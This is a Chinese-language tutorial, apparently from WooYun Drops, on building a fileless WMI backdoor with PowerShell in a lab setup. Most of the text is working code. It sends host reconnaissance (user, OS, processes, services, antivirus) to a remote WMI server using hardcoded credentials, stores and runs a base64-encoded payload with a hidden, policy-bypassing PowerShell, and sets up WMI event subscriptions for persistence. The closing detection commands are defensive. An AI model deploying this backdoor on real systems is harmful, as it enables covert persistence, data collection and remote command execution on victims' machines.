# WMI Backdoor

0x00 前言
=======

* * *

上篇介绍了如何通过powershell来实现WMI attacks，这次接着介绍一些`进阶WMI技巧---WMI Backdoor`

![这里写图片描述](http://drops.javaweb.org/uploads/images/2ad8e771e0167a3dd82285d896dc8bb80afba7b9.jpg)

配图为Mandiant在M-Trends 2015报告中提到的“How threat actors use WMI to maintain persistence”（即上篇提到的隐蔽定时启动程序）

0x01 简介
=======

* * *

结合上篇WMI attacks的基础知识来设计WMI Backdoor

**特点**：

```
不在Client和Server留下任何文件
不改动注册表
仅使用powershell实现

```

0x02 测试环境
=========

* * *

CLIENT:
-------

```
192.168.40.208
Win8x86

```

SERVER：
-------

```
192.168.40.206
Win7x64
Username：a
Password：testtest

```

0x03 思路
=======

* * *

作为后门，所以把隐蔽性放在首位

**Clinet需要满足如下功能**：

```
上传信息至服务器
获取指令执行
定时启动

```

0x04 功能实现
=========

* * *

1、Client将本机信息发送至Server
----------------------

《WMI attacks-3、存储payload》提到，可将数据存储于此，不会留下文件，实际位于硬盘上的一个复杂的数据库中(objects.data)

**设计思路**：

```
Client获取主机配置信息-连接远程服务器-保存在远程服务器
Server读取信息

```

**实现**：

（1）Client获取主机配置信息-连接远程服务器-保存在远程服务器

Client端Powershell代码如下：

```
#连接192.168.40.206
$Options = New-Object Management.ConnectionOptions
$Options.Username = 'a'
$Options.Password = 'testtest'
$Options.EnablePrivileges = $True
$Connection = New-Object Management.ManagementScope
$Connection.Path = '\\192.168.40.206\root\cimv2'
$Connection.Options = $Options
$Connection.Connect()
$EvilClass = New-Object Management.ManagementClass($Connection, [String]::Empty, $null)
#新建类名
$EvilClass['__CLASS'] = 'Win32_UserInfo'
$EvilClass.Properties.Add('IP19216840208', [Management.CimType]::String, $False)
#获取主机配置信息
$GetOS=Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem 
$GetProcess=Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process
$GetService=Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service -Filter "State='Running'"
$GetUser=Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem
$GetAV=Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
#注：Powershell中换行符为`n
$EvilClass.Properties['IP19216840208'].Value =           $GetUser.UserName+"`n"+"OS:"+$GetOS.Caption+";"+$GetOS.OSArchitecture+"`n"+"AntiVirusProduct:"+ $GetAV.displayName+"`n"+"Process:"+"`n"+$GetProcess.Name+"`n"+"Service Start:"+"`n"+$GetService.Name
#存储
$EvilClass.Put()

```

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/c5552e1f0acf347931a9ec9e3fd3884c96fb3303.jpg)

（2）Server端执行查询获取主机信息

```
 ([WmiClass] 'Win32_UserInfo').Properties['IP19216840208']

```

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/0732b9a7da5f93fed23ae48dc199ab9321bfedde.jpg)

2、Client获取指令并执行
---------------

**设计思路**：

```
Client加密存储指令
Client读取指令-解密-执行

```

**实现**：

（1）Client加密存储指令

Client端Powershell代码如下：

```
#定义Payload，为保证变量能够解析，需要使用单引号‘
$Payload=@'
$Options = New-Object Management.ConnectionOptions
$Options.Username = 'a'
$Options.Password = 'testtest'
$Options.EnablePrivileges = $True
$Connection = New-Object Management.ManagementScope
$Connection.Path = '\\192.168.40.206\root\cimv2'
$Connection.Options = $Options
$Connection.Connect()
$EvilClass = New-Object Management.ManagementClass($Connection, [String]::Empty, $null)
$EvilClass['__CLASS'] = 'Win32_CommandTest'
$EvilClass.Properties.Add('IP19216840208', [Management.CimType]::String, $False)
$EvilClass.Properties['IP19216840208'].Value ="Run Command Test!" 
$EvilClass.Put() 
'@
#对payload作base64加密
$bytes  = [System.Text.Encoding]::Unicode.GetBytes($Payload);
$EncodedPayload = [System.Convert]::ToBase64String($bytes); 
#存储加密后的payload
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_Command'
$StaticClass.Put()
$StaticClass.Properties.Add('EnCommand' , $EncodedPayload)
$StaticClass.Put() 

```

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/5a869710f2ca67dd460e871d7bf1ee94aa7aca6b.jpg)

（2）查看加密的payload

```
([WmiClass] 'Win32_Command').Properties['EnCommand']

```

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/37752c692ded707c3425aaa5fabba975b371c90c.jpg)

（3）Client读取指令-解密-执行

```
#读取加密payload
$EncodedPayload=([WmiClass] 'Win32_Command').Properties['EnCommand'].Value
#PowerShell执行命令
$PowerShellPayload = "powershell -ep bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc $EncodedPayload"
Invoke-WmiMethod  -Class Win32_Process -Name Create -ArgumentList $PowerShellPayload
#显示解密指令
$bytes2  = [System.Convert]::FromBase64String($EncodedPayload);
$decoded = [System.Text.Encoding]::Unicode.GetString($bytes2); 
"decoded Payload:"
$decoded

```

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/208f13a3f2a396c3204b8e3ce2f37e1814368047.jpg)

server端执行

`([WmiClass] 'Win32_CommandTest').Properties['IP19216840208']`

验证是否成功

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/be39e8e1e5f35d6b54f35823aa68530533c387c3.jpg)

3、Client定时执行powershell命令
------------------------

```
#读取加密指令
$EncodedPayload=([WmiClass] 'Win32_Command').Properties['EnCommand'].Value
$filterName = 'BotFilter56'
$consumerName = 'BotConsumer56'
#创建一个__EventFilter，用于设定触发条件，每隔60s执行一次
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE
TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop

#创建一个CommandLineEventConsumer，用于设定执行的操作
$Arg =@{
        Name=$consumerName
            CommandLineTemplate="C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe  -NonInteractive  -enc $EncodedPayload"
}

$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $Arg
#用于绑定filter和consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}

```

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/4326c576972aeec4c8f4d9fe3d1a134efb7f1edc.jpg)

0x05 补充
=======

* * *

对于定时启动功能的进一步说明

### 1、EventFilter

可以理解为通过执行WQL查询来设定触发条件，包括以下查询：

（1）Data queries

```
SELECT * FROM Win32_NTLogEvent WHERE Logfile = 'Application

```

（2）Event queries

```
SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Service' AND TargetInstance._Class = 'win32_TerminalService'

```

（3）Schema queries

```
SELECT * FROM meta_class WHERE __this ISA "Win32_BaseService"

```

2、 consumer
-----------

可以理解为条件满足后执行的操作，包括如下查询：

```
（1）ActiveScriptEventConsumer    
（2）LogFileEventConsumer 
（3）NTEventLogEventConsumer
（4）SMTPEventConsumer
（5）CommandLineEventConsumer

```

3、使用consumer执行vbs脚本的两种方式
------------------------

（1）直接执行现有脚本

```
instance of ActiveScriptEventConsumer as $Cons
{
    Name = "ASEC";
    ScriptingEngine = "VBScript";
    ScriptFileName = "c:\\asec2.vbs";
};

```

（2）内嵌脚本，不会留下痕迹

```
instance of ActiveScriptEventConsumer as $Cons
{
    Name = "ASEC";
    ScriptingEngine = "VBScript";

    ScriptText =
        "Dim objFS, objFile\n"
        "Set objFS = CreateObject(\"Scripting.FileSystemObject\")\n"
        "Set objFile = objFS.OpenTextFile(\"C:\\ASEC.log\","
        " 8, true)\nobjFile.WriteLine \"Time: \" & Now & \";"
        " Entry made by: ASEC\"\nobjFile.WriteLine"
        " \"Application closed. UserModeTime:  \" & "
        "TargetEvent.TargetInstance.UserModeTime &_\n"
        "\"; KernelModeTime: \" & "
        "TargetEvent.TargetInstance.KernelModeTime "
        "& \" [hundreds of nanoseconds]\"\n"
        "objFile.Close\n";
};

```

参考资料：

> https://msdn.microsoft.com/en-us/library/aa392902(v=vs.85).aspx https://msdn.microsoft.com/en-us/library/aa393250(v=vs.85).aspx

0x06 小结
=======

* * *

本文仅用来介绍WMI Attacks的进阶应用技巧，请勿用于非法用途

再次提一下WMI的检测方法：

```
#List Event Filters
Get-WMIObject -Namespace root\Subscription -Class __EventFilter

#List Event Consumers
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer

#List Event Bindings
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding

```

查看日志

```
– Microsoft-Windows-WinRM/Operational
– Microsoft-Windows-WMI-Activity/Operational
– Microsoft-Windows-DistributedCOM

```

**甚至禁用Winmgmt服务从根本上阻止该方法的使用**

* * *

本文由三好学生原创并首发于乌云drops，转载请注明